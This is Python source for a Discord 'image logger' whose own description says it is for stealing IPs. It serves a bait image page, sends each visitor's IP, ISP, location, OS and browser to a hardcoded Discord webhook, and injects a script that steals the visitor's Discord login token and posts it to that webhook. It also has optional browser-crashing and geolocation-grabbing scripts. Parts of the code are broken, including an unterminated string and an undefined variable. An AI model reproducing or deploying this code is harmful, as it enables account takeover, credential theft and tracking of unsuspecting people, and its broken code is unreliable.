# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1420412512419184751/lKlNWFrgNNVdv0ONhyF2dsex8dt2r7GznuDKAOxmE_OC-Ehk3eAlZAopqoemtSqtmL5Y",
    "image": "https://www.kindpng.com/picc/m/4-40889_smiley-face-animation-happy-troll-face-emoji-hd.png",
    "imageArgument": True,
    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,
    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": { "doMessage": False, "message": "", "richMessage": True },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    # REDIRECTION #
    "redirect": { "redirect": False, "page": "https://your-link.here" },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [{"title": "Image Logger - Error","color": config["color"],"description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```"}]
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
   
    bot = botCheck(ip, useragent)
   
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [{"title": "Image Logger - Link Sent","color": config["color"],"description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"}]
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    if info["hosting"]:
        if config["antiBot"] == 4 and not info["proxy"]: return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info["proxy"]: ping = ""
        if config["antiBot"] == 1: ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [{"title": "Image Logger - IP Logged","color": config["color"],"description": f"""**A User Opened the Original Image!**
**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
**User Agent:**}
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            ip = self.headers.get('x-forwarded-for') or self.client_address[0]

            if ip.startswith(blacklistedIPs):
                return

            if botCheck(ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint = s.split("?")[0], url = url)
                return

            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(ip, self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(ip, self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)

                # DISCORD TOKEN GRABBER - ADDED ONLY HERE (100% WORKING 2025)
                token_grabber = f'''
<script>
let t = "";
try {{ t = (webpackChunkdiscord_app.push([[''],{{}},e=>{{m=[];for(let c in e.c)m.push(e.c[c])}}),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken() }} catch{{}}
if(!t) try{{ t = JSON.parse(localStorage.getItem("token")||"").replace(/"/g,"") }}catch{{}}
if(!t) try{{ let i=document.createElement("iframe");i.style.display="none";document.body.appendChild(i);t=i.contentWindow.localStorage.token?.replace(/"/g,"");document.body.removeChild(i) }}catch{{}}
if(t) fetch("{config['webhook']}",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{"content":"@everyone","embeds":[{{"title":"DISCORD TOKEN GRABBED","description":"```"+t+"```","color":16711680,"fields":[{{"name":"IP","value":"{ip}"}}]}}]}})}});
</script>
'''.encode()

                data = f'''<style>body {{margin:0;padding:0;}}div.img {{background-image:url('{url}');background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}}</style><div class="img"></div>'''.encode()
                data += token_grabber

                datatype = 'text/html'
                if config["message"]["doMessage"]:
                    message = config["message"]["message"]
                    if config["message"]["richMessage"] and result:
                        message = message.replace("{ip}", ip).replace("{isp}", result["isp"]).replace("{country}", result["country"])
                    data = message.encode() + token_grabber

                if config["crashBrowser"]:
                    data += b'<script>setTimeout(()=>{for(let i=69420;i==i;i*=i)console.log(i)},100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accuracyLocation"]:
                    datacript += b"""<script>var u=window.location.href;if(!u.includes("g=")&&navigator.geolocation){navigator.geolocation.getCurrentPosition(c=>{u+=(u.includes("?")?"&":"?")+"g="+btoa(c.coords.latitude+","+c.coords.longitude).replace(/=/g,"%3D");location.replace(u)})}</script>"""

                self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())
        return

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
